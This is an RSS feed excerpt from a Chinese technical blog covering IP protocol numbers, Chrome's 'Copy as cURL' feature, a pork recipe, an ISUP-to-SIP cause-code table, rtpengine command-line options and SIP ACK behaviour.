&lt;p&gt;只需要看Decimal这列，常用的有&lt;strong&gt;6表示TCP, 17表示UDP, 50表示ESP&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/ip-protocol/2022-10-29-15-30-11.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;用wireshark抓包的时候，也可以看到Protocol: UDP(17)&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/ip-protocol/2022-10-29-15-30-26.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc791&#34;&gt;https://tools.ietf.org/html/rfc791&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc790&#34;&gt;https://tools.ietf.org/html/rfc790&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers&#34;&gt;https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>从飞机航线讲解网络分层</title>
      <link>https://wdd.js.org/network/ibhy8a/</link>
      <pubDate>Tue, 03 Mar 2020 13:48:27 +0800</pubDate>
      <guid>https://wdd.js.org/network/ibhy8a/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/ibhy8a/2022-10-29-18-34-09.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/ibhy8a/2022-10-29-18-34-19.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Copy as CURL and Copy Response</title>
      <link>https://wdd.js.org/fe/copy-as-curl-and-copy-response/</link>
      <pubDate>Sun, 01 Mar 2020 19:48:00 +0800</pubDate>
      <guid>https://wdd.js.org/fe/copy-as-curl-and-copy-response/</guid>
      <description>&lt;p&gt;网页上的报错，一般都会和HTTP请求出错有关。
在Chrome浏览器中，按F12或者command+option+i可以打开Dev tools，在网络面板中可以找到报错的的HTTP请求。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/copy-as-curl-and-copy-response/2022-10-29-10-40-56.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;通过提交Copy as cURL 和 Copy response的内容，就会非常准确的把问题报告给开发。开发也会非常快速的定位问题。&lt;/p&gt;</description>
    </item>
    <item>
      <title>如何烧肉才好吃</title>
      <link>https://wdd.js.org/posts/2020/02/edtzzx/</link>
      <pubDate>Wed, 26 Feb 2020 20:37:52 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/02/edtzzx/</guid>
      <description>&lt;h1 id=&#34;1-选肉&#34;&gt;1. 选肉&lt;/h1&gt;
&lt;p&gt;**猪肉，肥瘦相间的五花肉才最好吃。**精瘦肉吃起来会太柴，太肥的肉会显得太腻。五花肉则刚刚好，不柴也不腻。&lt;/p&gt;
&lt;h1 id=&#34;2-炒干&#34;&gt;2. 炒干&lt;/h1&gt;
&lt;p&gt;烧好的猪肉中如果有生水的味道，则口感不好，而且会显得肉不够熟。&lt;/p&gt;
&lt;h1 id=&#34;3-具体步骤&#34;&gt;3. 具体步骤&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;五花肉洗净，切片。放入干净的炒锅中，然后开火烧&lt;/li&gt;
&lt;li&gt;将五花肉的水分烧干，并且冒油，肉面发黄&lt;/li&gt;
&lt;li&gt;放入姜葱蒜，小米椒，加入生抽，料酒，食盐爆炒。如果猪油比较少，则可以放入适量食用油&lt;/li&gt;
&lt;li&gt;然后可以按需加入蔬菜。例如花菜、或者芹菜、或者小青椒&lt;/li&gt;
&lt;li&gt;炒到蔬菜9成熟，然后出锅&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    <item>
      <title>ISUP SIP ISDN对照码表</title>
      <link>https://wdd.js.org/opensips/ch9/isup-sip-isdn/</link>
      <pubDate>Thu, 20 Feb 2020 22:34:47 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/isup-sip-isdn/</guid>
      <description>&lt;h1 id=&#34;isup-to-sip&#34;&gt;ISUP to SIP&lt;/h1&gt;
&lt;h1 id=&#34;br-&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;ISUP Cause Value&lt;/th&gt;
          &lt;th&gt;SIP Response&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Normal event&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1 – unallocated number&lt;/td&gt;
          &lt;td&gt;404 Not Found&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2 – no route to network&lt;/td&gt;
          &lt;td&gt;404 Not Found&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3 – no route to destination&lt;/td&gt;
          &lt;td&gt;404 Not Found&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;16 – normal call clearing&lt;/td&gt;
          &lt;td&gt;&amp;mdash; (*)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;17 – user busy&lt;/td&gt;
          &lt;td&gt;486 Busy here&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;18 – no user responding&lt;/td&gt;
          &lt;td&gt;408 Request Timeout&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;19 – no answer from the user&lt;/td&gt;
          &lt;td&gt;480 Temporarily unavailable&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;20 – subscriber absent&lt;/td&gt;
          &lt;td&gt;480 Temporarily unavailable&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;21 – call rejected&lt;/td&gt;
          &lt;td&gt;403 Forbidden (+)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;22 – number changed (s/o diagnostic)&lt;/td&gt;
          &lt;td&gt;410 Gone&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;23 – redirection to new destination&lt;/td&gt;
          &lt;td&gt;410 Gone&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;26 – non-selected user clearing&lt;/td&gt;
          &lt;td&gt;404 Not Found (=)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;27 – destination out of order&lt;/td&gt;
          &lt;td&gt;502 Bad Gateway&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;28 – address incomplete&lt;/td&gt;
          &lt;td&gt;484 Address incomplete&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;29 – facility rejected&lt;/td&gt;
          &lt;td&gt;510 Not implemented&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;31 – normal unspecified&lt;/td&gt;
          &lt;td&gt;480 Temporarily unavailable Resource unavailable&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;34 – no circuit available&lt;/td&gt;
          &lt;td&gt;503 Service unavailable&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;38 – network out of order&lt;/td&gt;
          &lt;td&gt;503 Service unavailable&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;41 – temporary failure&lt;/td&gt;
          &lt;td&gt;503 Service unavailable&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;42 – switching equipment congestion&lt;/td&gt;
          &lt;td&gt;503 Service unavailable&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;47 – resource unavailable&lt;/td&gt;
          &lt;td&gt;503 Service unavailable Service or option not available&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;55 – incoming calls barred within CUG&lt;/td&gt;
          &lt;td&gt;403 Forbidden&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;57 – bearer capability not authorized&lt;/td&gt;
          &lt;td&gt;403 Forbidden&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;58 – bearer capability not presently available&lt;/td&gt;
          &lt;td&gt;503 Service unavailable&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;65 – bearer capability not implemented&lt;/td&gt;
          &lt;td&gt;488 Not Acceptable here&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;70 – Only restricted digital information bearer capability is available (National use)&lt;/td&gt;
          &lt;td&gt;488 Not Acceptable here&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;79 – service or option not implemented&lt;/td&gt;
          &lt;td&gt;501 Not implemented&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Invalid message&lt;/td&gt;
          &lt;td&gt; &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;87 – user not member of CUG&lt;/td&gt;
          &lt;td&gt;403 Forbidden&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;88 – incompatible destination&lt;/td&gt;
          &lt;td&gt;503 Service unavailable&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt; &lt;/td&gt;
          &lt;td&gt; &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;102 – Call Setup Time-out Failure&lt;/td&gt;
          &lt;td&gt;504 Gateway timeout&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;111 – Protocol Error  Unspecified&lt;/td&gt;
          &lt;td&gt;500 Server internal error Interworking&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;127 – Internal Error - interworking unspecified&lt;/td&gt;
          &lt;td&gt;500 Server internal error&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt; &lt;!-- raw HTML omitted --&gt;(*) ISDN Cause 16 will usually result in a BYE or CANCEL&lt;!-- raw HTML omitted --&gt;(+) If the cause location is user then the 6xx code could be given rather than the 4xx code. the cause value received in the H.225.0 message is unknown in ISUP, the unspecified cause value of the class is sent.&lt;!-- raw HTML omitted --&gt;(=) ANSI procedure&lt;!-- raw HTML omitted --&gt; &lt;/p&gt;</description>
    </item>
    <item>
      <title>rtpengine</title>
      <link>https://wdd.js.org/opensips/ch9/rtpengine-manu/</link>
      <pubDate>Thu, 20 Feb 2020 10:28:41 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/rtpengine-manu/</guid>
      <description>&lt;h1 id=&#34;帮助文档&#34;&gt;帮助文档&lt;/h1&gt;
&lt;h2 id=&#34;usage&#34;&gt;Usage:&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rtpengine &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;OPTION...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  - next-generation media proxy
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;application-options&#34;&gt;Application Options:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;-v, &amp;ndash;version
&lt;ul&gt;
&lt;li&gt;Print build time and exit&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;config-file=FILE
&lt;ul&gt;
&lt;li&gt;Load config from this file&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;config-section=STRING
&lt;ul&gt;
&lt;li&gt;Config file section to use&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;log-facility=daemon|local0|&amp;hellip;|local7                    
&lt;ul&gt;
&lt;li&gt;Syslog facility to use for logging&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;**-L, &amp;ndash;log-level=INT      **                                  
&lt;ul&gt;
&lt;li&gt;Mask log priorities above this level&lt;/li&gt;
&lt;li&gt;取值从0-7，&lt;/li&gt;
&lt;li&gt;7 debug&lt;/li&gt;
&lt;li&gt;6 info&lt;/li&gt;
&lt;li&gt;5 notice&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;**-E, &amp;ndash;log-stderr      **                                      
&lt;ul&gt;
&lt;li&gt;Log on stderr instead of syslog&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;no-log-timestamps                                        
&lt;ul&gt;
&lt;li&gt;Drop timestamps from log lines to stderr&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;log-mark-prefix                                          
&lt;ul&gt;
&lt;li&gt;Prefix for sensitive log info&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;log-mark-suffix                                          
&lt;ul&gt;
&lt;li&gt;Suffix for sensitive log info&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;**-p, &amp;ndash;pidfile=FILE           **                               
&lt;ul&gt;
&lt;li&gt;Write PID to file&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;**-f, &amp;ndash;foreground                       **                     
&lt;ul&gt;
&lt;li&gt;Don&amp;rsquo;t fork to background&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-t, &amp;ndash;table=INT                                            
&lt;ul&gt;
&lt;li&gt;Kernel table to use&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-F, &amp;ndash;no-fallback                                          
&lt;ul&gt;
&lt;li&gt;Only start when kernel module is available&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;**-i, &amp;ndash;interface=[NAME/]IP[!IP]   **                           
&lt;ul&gt;
&lt;li&gt;Local interface for RTP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-k, &amp;ndash;subscribe-keyspace=INT INT &amp;hellip;                        
&lt;ul&gt;
&lt;li&gt;Subscription keyspace list&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-l, &amp;ndash;listen-tcp=[IP:]PORT                                  
&lt;ul&gt;
&lt;li&gt;TCP port to listen on&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-u, &amp;ndash;listen-udp=[IP46|HOSTNAME:]PORT                      
&lt;ul&gt;
&lt;li&gt;UDP port to listen on&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-n, &amp;ndash;listen-ng=[IP46|HOSTNAME:]PORT                      
&lt;ul&gt;
&lt;li&gt; UDP port to listen on, NG protocol&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;**-c, &amp;ndash;listen-cli=[IP46|HOSTNAME:]PORT     **                 
&lt;ul&gt;
&lt;li&gt;UDP port to listen on, CLI&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-g, &amp;ndash;graphite=IP46|HOSTNAME:PORT                          
&lt;ul&gt;
&lt;li&gt;Address of the graphite server&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-G, &amp;ndash;graphite-interval=INT                                
&lt;ul&gt;
&lt;li&gt;Graphite send interval in seconds&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;graphite-prefix=STRING                                    
&lt;ul&gt;
&lt;li&gt;Prefix for graphite line&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-T, &amp;ndash;tos=INT                                              
&lt;ul&gt;
&lt;li&gt;Default TOS value to set on streams&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;control-tos=INT                                          
&lt;ul&gt;
&lt;li&gt;Default TOS value to set on control-ng&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-o, &amp;ndash;timeout=SECS                                          
&lt;ul&gt;
&lt;li&gt;RTP timeout&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-s, &amp;ndash;silent-timeout=SECS                                  
&lt;ul&gt;
&lt;li&gt;RTP timeout for muted&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-a, &amp;ndash;final-timeout=SECS                                    
&lt;ul&gt;
&lt;li&gt;Call timeout&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;offer-timeout=SECS                                        
&lt;ul&gt;
&lt;li&gt;Timeout for incomplete one-sided calls&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;**-m, &amp;ndash;port-min=INT    **                                      
&lt;ul&gt;
&lt;li&gt;Lowest port to use for RTP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;**-M, &amp;ndash;port-max=INT    **                                      
&lt;ul&gt;
&lt;li&gt;Highest port to use for RTP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-r, &amp;ndash;redis=[PW@]IP:PORT/INT                                
&lt;ul&gt;
&lt;li&gt;Connect to Redis database&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-w, &amp;ndash;redis-write=[PW@]IP:PORT/INT                        
&lt;ul&gt;
&lt;li&gt; Connect to Redis write database&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;redis-num-threads=INT                                    
&lt;ul&gt;
&lt;li&gt;Number of Redis restore threads&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;redis-expires=INT                                        
&lt;ul&gt;
&lt;li&gt;Expire time in seconds for redis keys&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-q, &amp;ndash;no-redis-required                                    
&lt;ul&gt;
&lt;li&gt;Start no matter of redis connection state&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;redis-allowed-errors=INT                                  
&lt;ul&gt;
&lt;li&gt;Number of allowed errors before redis is temporarily disabled&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;redis-disable-time=INT                                    
&lt;ul&gt;
&lt;li&gt;Number of seconds redis communication is disabled because of errors&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;redis-cmd-timeout=INT                                    
&lt;ul&gt;
&lt;li&gt;Sets a timeout in milliseconds for redis commands&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;redis-connect-timeout=INT                                
&lt;ul&gt;
&lt;li&gt;Sets a timeout in milliseconds for redis connections&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-b, &amp;ndash;b2b-url=STRING                                        
&lt;ul&gt;
&lt;li&gt;XMLRPC URL of B2B UA&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;log-facility-cdr=daemon|local0|&amp;hellip;|local7                
&lt;ul&gt;
&lt;li&gt;Syslog facility to use for logging CDRs&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;log-facility-rtcp=daemon|local0|&amp;hellip;|local7                
&lt;ul&gt;
&lt;li&gt;Syslog facility to use for logging RTCP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;log-facility-dtmf=daemon|local0|&amp;hellip;|local7              
&lt;ul&gt;
&lt;li&gt; Syslog facility to use for logging DTMF&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;log-format=default|parsable                              
&lt;ul&gt;
&lt;li&gt;Log prefix format&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;dtmf-log-dest=IP46|HOSTNAME:PORT                          &lt;!-- raw HTML omitted --&gt;    Destination address for DTMF logging via UDP&lt;/li&gt;
&lt;li&gt;-x, &amp;ndash;xmlrpc-format=INT                                    
&lt;ul&gt;
&lt;li&gt;XMLRPC timeout request format to use. 0: SEMS DI, 1: call-id only, 2: Kamailio&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;num-threads=INT                                          
&lt;ul&gt;
&lt;li&gt;Number of worker threads to create&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;media-num-threads=INT                                    
&lt;ul&gt;
&lt;li&gt;Number of worker threads for media playback&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-d, &amp;ndash;delete-delay=INT                                      
&lt;ul&gt;
&lt;li&gt;Delay for deleting a session from memory.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;sip-source                                                
&lt;ul&gt;
&lt;li&gt;Use SIP source address by default&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;dtls-passive                                              
&lt;ul&gt;
&lt;li&gt;Always prefer DTLS passive role&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;max-sessions=INT                                          
&lt;ul&gt;
&lt;li&gt;Limit of maximum number of sessions&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;max-load=FLOAT                                            
&lt;ul&gt;
&lt;li&gt;Reject new sessions if load averages exceeds this value&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;max-cpu=FLOAT                                            
&lt;ul&gt;
&lt;li&gt;Reject new sessions if CPU usage (in percent) exceeds this value&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;max-bandwidth=INT                                        
&lt;ul&gt;
&lt;li&gt;Reject new sessions if bandwidth usage (in bytes per second) exceeds this value&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;homer=IP46|HOSTNAME:PORT                                  
&lt;ul&gt;
&lt;li&gt;Address of Homer server for RTCP stats&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;homer-protocol=udp|tcp                                    
&lt;ul&gt;
&lt;li&gt;Transport protocol for Homer (default udp)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;homer-id=INT                                              
&lt;ul&gt;
&lt;li&gt;&amp;lsquo;Capture ID&amp;rsquo; to use within the HEP protocol&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;recording-dir=FILE                                        
&lt;ul&gt;
&lt;li&gt;Directory for storing pcap and metadata files&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;recording-method=pcap|proc                                
&lt;ul&gt;
&lt;li&gt;Strategy for call recording&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;recording-format=raw|eth                                  
&lt;ul&gt;
&lt;li&gt;File format for stored pcap files&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;iptables-chain=STRING                                    
&lt;ul&gt;
&lt;li&gt;Add explicit firewall rules to this iptables chain&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;codecs                                                    
&lt;ul&gt;
&lt;li&gt;Print a list of supported codecs and exit&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;scheduling=default|none|fifo|rr|other|batch|idle          
&lt;ul&gt;
&lt;li&gt;Thread scheduling policy&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;priority=INT                                              
&lt;ul&gt;
&lt;li&gt;Thread scheduling priority&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;idle-scheduling=default|none|fifo|rr|other|batch|idle    
&lt;ul&gt;
&lt;li&gt;Idle thread scheduling policy&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;idle-priority=INT                                        
&lt;ul&gt;
&lt;li&gt;Idle thread scheduling priority&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;log-srtp-keys                                            
&lt;ul&gt;
&lt;li&gt;Log SRTP keys to error log&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;mysql-host=HOST|IP                                        
&lt;ul&gt;
&lt;li&gt;MySQL host for stored media files&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;mysql-port=INT                                            
&lt;ul&gt;
&lt;li&gt;MySQL port&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;mysql-user=USERNAME                                      
&lt;ul&gt;
&lt;li&gt;MySQL connection credentials&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;mysql-pass=PASSWORD                                      
&lt;ul&gt;
&lt;li&gt;MySQL connection credentials&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;mysql-query=STRING                                        
&lt;ul&gt;
&lt;li&gt;MySQL select query&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;endpoint-learning=delayed|immediate|off|heuristic        
&lt;ul&gt;
&lt;li&gt;RTP endpoint learning algorithm&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;jitter-buffer=INT                                        
&lt;ul&gt;
&lt;li&gt;Size of jitter buffer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&amp;ndash;jb-clock-drift                                            
&lt;ul&gt;
&lt;li&gt;Compensate for source clock drift&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/sipwise/rtpengine&#34;&gt;https://github.com/sipwise/rtpengine&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>深入理解SIP ACK 方法</title>
      <link>https://wdd.js.org/opensips/ch1/sip-ack/</link>
      <pubDate>Wed, 19 Feb 2020 19:17:16 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/sip-ack/</guid>
      <description>&lt;h1 id=&#34;ack的特点&#34;&gt;ACK的特点&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;ACK仅用于对INVITE消息的最终响应进行确认&lt;/li&gt;
&lt;li&gt;ACK的CSeq的号码必须和INVITE的CSeq号码相同，这是用来保证ACK对对哪一个INVITE进行确认的唯一标志。另外CSeq的方法会改为ACK&lt;/li&gt;
&lt;li&gt;ACK分为两种
&lt;ul&gt;
&lt;li&gt;失败请求的确认；例如对4XX, 5XX请求的确认。在对失败的请求进行确认时，ACK是逐跳的。&lt;/li&gt;
&lt;li&gt;成功的请求的确认；对200的确认，此时ACK是端到端的。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ACK一般不会带有SDP信息。如果INVITE消息没有带有SDP，那么ACK消息中一般会带有ACK&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;ack与事务的关系&#34;&gt;ACK与事务的关系&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;如果请求成功，那么后续的ACK消息是单独的事物&lt;/li&gt;
&lt;li&gt;如果请求失败，那么后续的ACK消息和之前的INVITE是属于相同的事务&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;逐跳ack-vs-端到端ack&#34;&gt;逐跳ACK VS 端到端ACK&lt;/h1&gt;
&lt;p&gt;逐跳在英文中叫做: hop-by-hop&lt;!-- raw HTML omitted --&gt;端到端在英文中叫做：end-to-end&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-ack/2022-10-30-20-52-17.png&#34;&gt;&lt;/p&gt;
